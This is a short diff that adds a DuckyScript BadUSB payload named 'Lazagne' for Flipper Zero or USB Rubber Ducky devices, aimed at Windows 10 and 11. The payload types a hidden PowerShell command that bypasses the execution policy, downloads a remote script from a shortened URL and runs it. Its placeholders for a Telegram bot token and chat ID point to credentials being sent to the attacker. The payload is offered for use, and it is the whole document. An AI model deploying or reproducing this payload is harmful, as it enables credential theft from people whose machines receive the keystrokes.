@@ -1,0 +1,8 @@
+REM     Title: Lazagne
+REM     Description: This Bad USB payload turns your Flipper or USB Rubber Ducky into a digital spy, grabbing passwords and credentials from vulnerable systems.
+REM     Target: Windows 10, 11
+
+GUI r
+DELAY 500
+STRING powershell -w h -NoP -Ep Bypass $bt='bot-token';$ci='chat-id';irm https://t.ly/-qlYd | iex
+ENTER
